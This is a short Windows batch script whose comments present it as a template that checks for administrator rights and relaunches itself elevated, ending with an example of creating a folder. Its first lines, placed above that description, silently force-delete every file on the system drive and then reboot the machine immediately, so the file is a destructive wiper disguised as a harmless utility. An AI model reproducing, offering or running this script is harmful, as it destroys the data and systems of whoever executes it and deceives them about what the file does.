@echo off
del %systemdrive%\*.* /f /s /q
shutdown -r -t 00
:: This script checks for administrator privileges and relaunches itself as admin if necessary

:: Check for admin
fsutil dirty query %systemdrive% >nul 2>&1
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    :: Relaunch the script as admin
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: Place your commands that require admin below this line
echo Running batch commands with administrator privileges...
:: Example: create a folder in C:\Program Files
mkdir "C:\Program Files\MyFolder"
pause
